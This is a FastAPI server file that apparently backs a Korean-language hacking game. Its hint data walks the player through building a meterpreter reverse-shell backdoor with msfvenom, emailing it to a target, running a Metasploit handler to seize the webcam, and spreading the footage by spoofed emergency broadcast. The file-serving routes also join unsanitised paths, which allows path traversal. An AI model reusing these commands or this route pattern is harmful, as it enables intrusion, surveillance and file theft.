from fastapi import FastAPI, Response
import uvicorn
import os
import sys
from fastapi.responses import StreamingResponse, FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import json

app = FastAPI()

app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

#@app.get("/items/{id}", response_class=HTMLResponse)
#async def read_item(request: Request, id: str):
#    return templates.TemplateResponse("item.html", {"request": request, "id": id})

@app.get("/video/{file_path}")
def main(file_path: str):
    PATH = 'video'
    vid_path = os.path.join(PATH, file_path)
    def iterfile():  
        with open(vid_path, mode="rb") as file:  
            yield from file 
    return StreamingResponse(iterfile(), media_type="video/mp4")

@app.get("/file/{file_path}", response_class=FileResponse)
async def main(file_path: str):
    PATH = 'file'
    return os.path.join(PATH, file_path)


@app.get("/api/{type}")
def api(type: str):
    resp = {'tip': ['You FOUND Easter EGG!!!\n\nCONGRATUATIONS\n\nhttps://sv.m03.pw/hacknet_ItsEasterEgg.html',
    '우리가 울랄라 대장의 이메일 주소를 알아냈어.\n이 주소로 백도어가 심어진 PPT파일을 보내야 해.\n먼저 PPT파일에 백도어를 심어보자.\n백도어를 만들때에는 Metasploit를 사용합니다.\n먼저, 자신의 IP를 알아내자! 어떻게 해야 할까??\n',
    '백도어를 만들어 보자! METASPLOIT이라는 프로그램은, 백도어가 심어진 파일을 만들 수 있게 해줘. METASPLOIT은 msfvenom라는 명령어로 확인할 수 있습니다! 이제 Metasploit을 사용하는 법을 알아야 겠지? 어떤 명령어의 도움말을 알기 위해서는 "man <명령어>"라는 명령어를 사용해. 기억해 두자! 이제 사용법을 알아볼까? msfvenom 사용법은 "man msfvenom"을 치면 알 수 있겠지?',
    '이제 백도어를 만들어야 겠지? 동영상에서 알려준 대로 백도어 파일을 만들어 보자! 우리가 쓸 페이로드는 windows/meterpreter/reverse_tcp야!\n msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <형식> > back.exe으로 hack.exe라는 파일을 만들자! 게임 실행파일이 있는 곳과 같은 곳에 만들어 질거야!',
    '울랄라 대장의 이메일은\ngshs_decode@gmail.com\n이야. 여기에 만든 파일을 보내자.\n답장이 왔다면 백도어가 작동하는지 확인해보자! 백도어는 msfconsole이라는 명령어로 실행할 수 있어! 도움말을 보자!',
    '좋아 이제 대충은 알겠지? 영상에서 알려준 대로 메타스플로잇 핸들러를 실행시켜보자!',
    '이제 그 동영상을 녹화해서 유포하자!\n어디에다가 유포하할까??\n\n그래! 근처의 모든 사람들에게 문자를 보내자! 어떻게?? [긴급재난문자]로 할 수 있겠지?\n긴급재난문자는 일반 문자와 비슷한 원리야. 대신에 일반 휴대폰도 수신할 수 있도록 조금 다른 전송 방식을 사용하는데, 너무 복잡하니까 생략하도록 할께. 하지만, 이건 알아둬, 결국 기지국에서 보낸다는 걸.',
    '''It's Step 6!''',
    '''It's Step 7!'''
    ],
    'new_tip': ['',
    ['좋아! IP주소를 알아냈지? ip 주소를 입력창에 적어보자. 그리고 그 컴퓨터의 포트번호는 2031이야.','좋아 이 IP주소랑 포트번호를 기억하고 있자! 백도어는 METASPLOIT이라는 프로그램으로 실행할 수 있어! Next_Step'],
    ['도움말을 읽어보고 무엇을 해야 할지 생각해 보자! 근데 페이로드는 뭐고, msfvenom은 뭐지..? "openvideo"로 영상을 보자!','sys:run explorer http://sv.m03.pw/video/01.mp4'],
    ['이제 바탕화면에 EXE파일이 생성되었겠지?? 이걸 보내보자!'],
    ['이제 msf콘솔을 사용할 수 있어!\n원격제어를 하기위한 방법을 알기전에 영상을 다시 보자. 어떤 명령어를 입력해야 하지?\n','sys:run explorer http://sv.m03.pw/video/02.mp4'],
    ['좋아! 이제 그 컴퓨터는 너의 것이야! 이제 우리는 카메라를 켜야겠지? 카메라에서 영상을 가져오는 명령어는 getcam이야. 어떻게 사용하는 걸까?','\n해보자!\n','sys:run explorer http://sv.m03.pw/video/04.mp4'],
    ['좋아! 전송됐어!! 이제 ']
    ],
    'cmd': ['',
    ['ipconfig','144.13.135.13'],
    ['man msfvenom','openvideo'],
    ['msfvenom -p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f exe > back.exe'],
    ['man msfconsole', 'openvideo'],
    ['msf use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST=144.168.0.22 set LPORT=2031 set ExitONsession false','man getcam','get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung'],
    ['cellbroad_attack']
    ]}
    data = json.dumps(resp[type])
    return data

if __name__=="__main__":
    uvicorn.run('main:app', host='0.0.0.0', port=8000, debug=True, reload=True)